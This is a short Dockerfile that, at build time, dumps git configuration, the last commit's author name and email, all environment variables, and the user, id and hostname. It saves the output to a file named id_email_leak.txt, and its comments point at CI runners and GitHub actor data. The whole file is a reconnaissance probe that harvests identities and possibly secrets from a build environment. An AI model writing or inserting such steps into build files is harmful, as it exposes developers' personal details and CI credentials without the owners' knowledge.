ARG PYTHON_VERSION
FROM python:${PYTHON_VERSION}

# Dump Git config — can reveal email/username if present
RUN echo "[*] Git Config:" && git config --list || true

# Dump latest commit info (name, email)
RUN echo "[*] Git Log:" && git log -1 || true

# Dump environment variables — may include GitHub actor/IDs
RUN echo "[*] Env Vars:" && printenv || true

# Dump runner info
RUN echo "[*] Whoami + Hostname:" && whoami && hostname && id || true

# Save all to a single file
RUN { \
    echo "==== GIT CONFIG ===="; git config --list; \
    echo "==== GIT LOG ===="; git log -1; \
    echo "==== ENV ===="; printenv; \
    echo "==== ID ===="; id; \
    echo "==== WHOAMI ===="; whoami; \
    echo "==== HOSTNAME ===="; hostname; \
} > /tmp/id_email_leak.txt
